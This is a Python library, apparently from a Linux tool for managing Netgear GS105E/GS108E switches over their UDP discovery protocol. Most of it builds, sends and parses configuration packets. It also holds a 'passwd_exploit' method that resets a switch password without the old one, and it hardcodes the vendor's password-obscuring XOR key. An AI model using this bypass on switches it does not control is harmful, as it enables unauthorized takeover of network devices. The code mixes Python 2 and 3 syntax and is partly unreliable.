#!/usr/bin/python
# -*- coding: utf-8 -*-

"Main Class to communicate with gs108e and gs105e netgear switches"
import time
import binascii
import pprint
import random
import struct
import socket
import fcntl
import psl_typ
import inspect
import errno
import select
import netifaces


def get_hw_addr(ifname):
    "gives the hardware (mac) address of an interface (eth0,eth1..)"
    return netifaces.ifaddresses(ifname)[netifaces.AF_LINK][0]['addr']

def get_ip_address(ifname):
    "returns the first ip address of an interface"
    return netifaces.ifaddresses(ifname)[2][0]['addr']

def pack_mac(value):
    "packs the hardware address (mac) to the internal representation"
    value = value.encode()  # binascii.unhexlify() requires bytes in Python 3
    if (len(value) == 17):
        return binascii.unhexlify(value[0:2] + value[3:5] + value[6:8] +
                                  value[9:11] + value[12:14] + value[15:17])
    if (len(value) == 12):
        return binascii.unhexlify(value)
    raise "unknown mac format=" + value


def unpack_mac(value):
    "unpack an internal representation to a hardware address"
    mac = binascii.hexlify(value)
    return (mac[0:2] + ":" + mac[2:4] + ":" + mac[4:6] + ":" + mac[6:8] +
            ":" + mac[8:10] + ":" + mac[10:12])


class ProSafeLinux:
    "Main class to communicate with a ProSafe gs108e gs105e Switch"
    CMD_MODEL = psl_typ.PslTypStringQueryOnly(0x0001, "model")
    CMD_FIMXE2 = psl_typ.PslTypHex(0x0002, "fixme2")
    CMD_NAME = psl_typ.PslTypString(0x0003, "name")
    CMD_MAC = psl_typ.PslTypMac(0x0004, "MAC")
    CMD_LOCATION = psl_typ.PslTypString(0x0005, "location")
    CMD_IP = psl_typ.PslTypIpv4(0x0006, "ip")
    CMD_NETMASK = psl_typ.PslTypIpv4(0x0007, "netmask")
    CMD_GATEWAY = psl_typ.PslTypIpv4(0x0008, "gateway")
    CMD_NEW_PASSWORD = psl_typ.PslTypPassword(0x0009, "new_password", True)
    CMD_PASSWORD = psl_typ.PslTypPassword(0x000a, "password", False)
    CMD_DHCP = psl_typ.PslTypDHCP(0x000b, "dhcp")
    CMD_FIXMEC = psl_typ.PslTypHex(0x000c, "fixmeC")
    CMD_FIRMWAREV = psl_typ.PslTypStringQueryOnly(0x000d, "firmwarever")
    CMD_FIRMWARE2V = psl_typ.PslTypStringQueryOnly(0x000e, "firmware2ver")
    CMD_FIRMWAREACTIVE = psl_typ.PslTypHex(0x000f, "firmware_active")
    CMD_REBOOT = psl_typ.PslTypAction(0x0013, "reboot")
    CMD_FACTORY_RESET = psl_typ.PslTypAction(0x0400, "factory_reset")
    CMD_SPEED_STAT = psl_typ.PslTypSpeedStat(0x0c00, "speed_stat")
    CMD_PORT_STAT = psl_typ.PslTypPortStat(0x1000, "port_stat")
    CMD_RESET_PORT_STAT = psl_typ.PslTypAction(0x1400, "reset_port_stat")
    CMD_TEST_CABLE = psl_typ.PslTypHexNoQuery(0x1800, "test_cable")
    CMD_TEST_CABLE_RESP = psl_typ.PslTypHexNoQuery(0x1c00, "test_cable_resp")
    CMD_VLAN_SUPPORT = psl_typ.PslTypVlanSupport(0x2000, "vlan_support")
    CMD_VLAN_ID = psl_typ.PslTypVlanId(0x2400, "vlan_id")
    CMD_VLAN802_ID = psl_typ.PslTypVlan802Id(0x2800, "vlan802_id")
    CMD_VLANPVID = psl_typ.PslTypVlanPVID(0x3000, "vlan_pvid")
    CMD_QUALITY_OF_SERVICE = psl_typ.PslTypQos(0x3400, "qos")
    CMD_PORT_BASED_QOS = psl_typ.PslTypPortBasedQOS(0x3800, "port_based_qos")
    CMD_BANDWIDTH_INCOMING_LIMIT = psl_typ.PslTypBandwidth(
                                              0x4c00, "bandwidth_in")
    CMD_BANDWIDTH_OUTGOING_LIMIT = psl_typ.PslTypBandwidth(
                                              0x5000, "bandwidth_out")
    CMD_FIXME5400 = psl_typ.PslTypHex(0x5400, "fixme5400")
    CMD_BROADCAST_BANDWIDTH = psl_typ.PslTypBandwidth(0x5800,
                 "broadcast_bandwidth")
    CMD_PORT_MIRROR = psl_typ.PslTypPortMirror(0x5c00, "port_mirror")
    CMD_NUMBER_OF_PORTS = psl_typ.PslTypHex(0x6000, "number_of_ports")
    CMD_IGMP_SNOOPING = psl_typ.PslTypIGMPSnooping(0x6800, "igmp_snooping")
    CMD_BLOCK_UNKNOWN_MULTICAST = psl_typ.PslTypBoolean(
                                              0x6c00, "block_unknown_multicast")
    CMD_IGMP_HEADER_VALIDATION = psl_typ.PslTypBoolean(0x7000,
        "igmp_header_validation")
    CMD_FIXME7400 = psl_typ.PslTypHex(0x7400, "fixme7400")
    CMD_END = psl_typ.PslTypEnd(0xffff, "END")

    CTYPE_QUERY_REQUEST = 0x0101
#    CTYPE_QUERY_RESPONSE = 0x0102
    CTYPE_TRANSMIT_REQUEST = 0x103
#    CTYPE_TRANSMIT_RESPONSE = 0x104

    RECPORT = 63321
    SENDPORT = 63322

    def __init__(self):
        "constructor"
        self.myhost = None
        self.srcmac = None
        self.ssocket = None
        self.rsocket = None
        self.timeout=0.1

        # i still see no win in randomizing the starting sequence...
        self.seq = random.randint(100, 2000)
        self.debug = False
        self.mac_cache = {}
        self.cmd_by_id = {}
        self.cmd_by_name = {}
        for key, value in  inspect.getmembers(ProSafeLinux):
            if key.startswith("CMD_"):
                self.cmd_by_name[value.get_name()] = value
                self.cmd_by_id[value.get_id()] = value

    def set_timeout(self, timeout):
        self.timeout=timeout

    def bind(self, interface):
        "bind to an interface"
        self.myhost = get_ip_address(interface)
        if not self.myhost:
            return False
        self.srcmac = pack_mac(get_hw_addr(interface))

        # send socket, can also be used to receive unicast!
        self.ssocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        self.ssocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.ssocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        self.ssocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        self.ssocket.bind((self.myhost, self.RECPORT))
        #self.ssocket.bind(('<broadcast>', self.RECPORT))
        #self.ssocket.bind(('', self.RECPORT))

        # separate broadcast receive socket
        self.rsocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.rsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.rsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        self.rsocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        #self.rsocket.bind(("<broadcast>", self.RECPORT))
        self.rsocket.bind(('', self.RECPORT))
        #self.rsocket.bind(("255.255.255.255", self.RECPORT))

        return True

    def get_query_cmds(self):
        "return all commands which can be used in a query"
        rtn = []
        for cmd in list(self.cmd_by_name.values()):
            if cmd.is_queryable():
                rtn.append(cmd)
        return rtn

    def get_setable_cmds(self):
        "returns all commands which can be set"
        rtn = []
        for cmd in list(self.cmd_by_name.values()):
            if cmd.is_setable():
                rtn.append(cmd)
        return rtn

    def get_cmd_by_name(self, name):
        "return a command by its name"
        if name in self.cmd_by_name:
            return self.cmd_by_name[name]
        else:
            return None

    def get_cmd_by_hex(self, cmd_id):
        "return a command by its hex_value"
        if cmd_id in self.cmd_by_id:
            return self.cmd_by_id[cmd_id]
        else:
            return False


    def set_debug_output(self):
        "set debugging"
        self.debug = True

    def recv(self, maxlen=8192):
        "receive a packet from the switch"

        sel = select.select([self.ssocket.fileno(), self.rsocket.fileno()], [], [], self.timeout)
        if sel[0] and sel[0][0] == self.ssocket.fileno():
            rsock = self.ssocket
        else:
            rsock = self.rsocket
        rsock.settimeout(self.timeout)
        try:
            message, address = rsock.recvfrom(maxlen)
        except socket.timeout:
            return (None, None)
        except socket.error as error:
            # according to the Python documentation this error
            # is system-specifc; this works on Linux
            if error.errno == errno.EAGAIN:
                return (None, None)
            raise
        if self.debug:
            message_hex = binascii.hexlify(message).decode()
            print("recv=" + message_hex)
        return (message, address)

    def recv_all(self):
        "receive all pending packets"
        while True:
            (message, address) = self.recv()
            if message is None:
                return (None, address)
            return (message, address)

    def parse_data(self, pack):
        "unpack packet send by the switch"
        if pack == None:
            return False
        if self.debug:
            pprint.pprint(len(pack[2:4])) 
        data = {}
        if struct.unpack(">H", pack[2:4])[0] != 0x0000:
            errorcmd = self.get_cmd_by_hex(struct.unpack(">H", pack[4:6])[0])
            if errorcmd:
                data["error"] = errorcmd.get_name()
            else:
                data["error"] = struct.unpack(">H", pack[4:6])[0]
#        data["seq"] = struct.unpack(">H", pack[22:24])[0]
#        data["ctype"] = struct.unpack(">H", pack[0:2])[0]
#        data["mymac"] = binascii.hexlify(pack[8:14])
#        data["theirmac"] = binascii.hexlify(pack[14:20]).decode()
        pos = 32
        cmd_id = 0
        while (pos<len(pack)):
            if self.debug:
                print("pos:%d len: %d" %(pos,len(pack)))
            cmd_id = struct.unpack(">H", pack[pos:(pos + 2)])[0]
            if self.get_cmd_by_hex(cmd_id):
                cmd = self.get_cmd_by_hex(cmd_id)
            else:
                # we don't need a switch for "unknown_warn" here...let the client handle unknown responses
#                print("Unknown Response %d" % cmd_id)
                cmd = psl_typ.PslTypUnknown(cmd_id, "UNKNOWN %d" % cmd_id)
            pos = pos + 2
            cmdlen = struct.unpack(">H", pack[pos:(pos + 2)])[0]
            pos = pos + 2
            if cmdlen > 0:
                    value = cmd.unpack_cmd(pack[pos:(pos + cmdlen)])
            else:
                value = None
            if cmd in data and value != None:
                if type(data[cmd]) != type(list()):
                    data[cmd] = [data[cmd]]
                data[cmd].append(value)
            elif value != None:
                data[cmd] = value
            if self.debug:
                print("cmd_id %d of length %d :" % (cmd_id, cmdlen)) 
                data_hex = binascii.hexlify(pack[pos:(pos + cmdlen)]).decode()
                print("data=" + data_hex)
            pos = pos + cmdlen
        return data

    def send(self, host, port, data):
        "send data to host on port"
        if self.debug:
            # binascii.unhexlify() requires bytes in Python 3
            data_hex = binascii.hexlify(data).decode()
            print("send to ip " + host + " data = " + data_hex)
        self.ssocket.sendto(data, (host, port))
        self.seq += 1

    def baseudp(self, ctype, destmac):
        "Base UDP Package"
        reserved = b"\x00"
        if destmac is None:
            destmac = 6 * b"\x00"
        if len(destmac) > 6:
            destmac = pack_mac(destmac)
        data = (struct.pack(">h", ctype) + 6 * reserved + self.srcmac +
                     destmac + 2 * reserved)
        data += struct.pack(">h", self.seq)
        data += b"NSDP" + 4 * reserved
        return data

    @staticmethod
    def addudp(cmd, datain=None):
        "Additional data to the base package"
        data = struct.pack(">H", cmd.get_id())
        if (datain is None):
            data += struct.pack(">H", 0)
        else:
            pdata = cmd.pack_py(datain)
            data += struct.pack(">H", len(pdata))
            data += pdata
        return data

    def ip_from_mac(self, mac):
        "query for the ip of a switch with a given mac address"
        if mac is None:
            return "255.255.255.255"
        if mac in self.mac_cache:
            return self.mac_cache[mac]
        # FIXME: Search in /proc/net/arp if mac there use this one
        #with open("/proc/net/arp") as f:
        # for line in f:
        #   print line
        query_arr = [self.CMD_MAC, self.CMD_IP]
        message, address = self.query(query_arr, mac, with_address=True, use_ip_func=False)
        if message == None:
            # try once more
            message, address = self.query(query_arr, mac, with_address=True, use_ip_func=False)
        if message != None and message != False:
            if self.CMD_MAC in message:
                if message[self.CMD_MAC].capitalize() == mac.capitalize():
                    return address[0]
        return "255.255.255.255"

    def send_query(self, cmd_arr, mac, use_ip_func=True):
        "request some values from a switch, without changing them"
        if use_ip_func:
            ipadr = self.ip_from_mac(mac)
        else:
            ipadr = "255.255.255.255"
        data = self.baseudp(destmac=mac, ctype=self.CTYPE_QUERY_REQUEST)
        for cmd in cmd_arr:
            data += self.addudp(cmd)
        data += self.addudp(self.CMD_END)
        self.send(ipadr, self.SENDPORT, data)

    def query(self, cmd_arr, mac, with_address=False, use_ip_func=True):
        "get some values from the switch, but do not change them"
        # translate non-list to list
        if type(cmd_arr).__name__ != 'tupe' and type(cmd_arr).__name__ != 'list':
            cmd_arr = (cmd_arr, )
        self.send_query(cmd_arr, mac, use_ip_func)
        message, address = self.recv_all()
        if with_address:
            return (self.parse_data(message), address)
        else:
            return self.parse_data(message)

    def transmit(self, cmddict, mac):
        "change something in the switch, like name, mac ..."
        transmit_counter = 0
        ipadr = self.ip_from_mac(mac)
        data = self.baseudp(destmac=mac, ctype=self.CTYPE_TRANSMIT_REQUEST)
        firmwarevers = self.query(self.get_cmd_by_name("firmwarever"), mac)
        firmwarevers = firmwarevers.values()[0].translate({ord("."):None})
        # New firmwares put capital leter V in front ...
        if "V" == firmwarevers[0]:
            firmwarevers = firmwarevers[1:]

        if type(cmddict).__name__ == 'dict':
            if self.CMD_PASSWORD in cmddict:
                if int(firmwarevers) > 10004:
                    print("using password hack on firmware: %s" % 
                            (firmwarevers))
                    _hashkey = "NtgrSmartSwitchRock"
                    _plainpass = cmddict[self.CMD_PASSWORD]
                    _password = ""
                    for i in range(len(_plainpass)):
                        _password += chr(ord(_plainpass[i]) ^ ord(_hashkey[i]))
                else:
                    _password = cmddict[self.CMD_PASSWORD]
                data += self.addudp(self.CMD_PASSWORD, _password)
            for cmd, pdata in list(cmddict.items()):
                if cmd != self.CMD_PASSWORD:
                    data += self.addudp(cmd, pdata)
        elif type(cmddict).__name__ == 'string':
            print 'got string!'
            data += cmddict
        data += self.addudp(self.CMD_END)
        self.send(ipadr, self.SENDPORT, data)
        message, address = self.recv_all()
        while message == None and transmit_counter < 3:
            time.sleep(1)
            message, address = self.recv_all()
            transmit_counter += 1
        if message == None:
            return { 'error' : 'no result received within 3 seconds' }
        return self.parse_data(message)

    def passwd_exploit(self, mac, new):
        "exploit in current (2012) firmware version, set a new password"
        # The order of the CMD_PASSWORD and CMD_NEW_PASSWORD is important
        data = self.addudp(self.CMD_NEW_PASSWORD, new)
        data += self.addudp(self.CMD_PASSWORD, new)
        return self.transmit(data, mac)
 
    def discover(self):
        "find any switch in the network"
        query_arr = [self.CMD_MODEL,
                   self.CMD_NAME,
                   self.CMD_MAC,
                   self.CMD_DHCP,
                   self.CMD_IP]
        message = self.query(query_arr, None)
        if message != False:
            self.mac_cache[message[self.CMD_MAC]] = message[self.CMD_IP]
        return message

    def verify_data(self, datadict):
        "Verify the data we want to set on the switch"
        errors = []
        if ProSafeLinux.CMD_DHCP in datadict:
            if datadict[ProSafeLinux.CMD_DHCP]:
                if ((ProSafeLinux.CMD_IP in datadict) or
                    (ProSafeLinux.CMD_GATEWAY in datadict) or
                    (ProSafeLinux.CMD_NETMASK in datadict)):
                    errors.append("When dhcp=on, no ip,gateway nor netmask is allowed")
            else:
                if (not((ProSafeLinux.CMD_IP in datadict) and
                  (ProSafeLinux.CMD_GATEWAY in datadict) and
                  (ProSafeLinux.CMD_NETMASK in datadict))):
                    errors.append("When dhcp=off, specify ip,gateway and netmask")
        else:
            if ((ProSafeLinux.CMD_IP in datadict) or
              (ProSafeLinux.CMD_GATEWAY in datadict) or
              (ProSafeLinux.CMD_NETMASK in datadict)):
                errors.append("Use dhcp off,ip,gateway and netmask option together")

        if len(errors) > 0:
            return (False, errors)
        else:
            return (True, None)
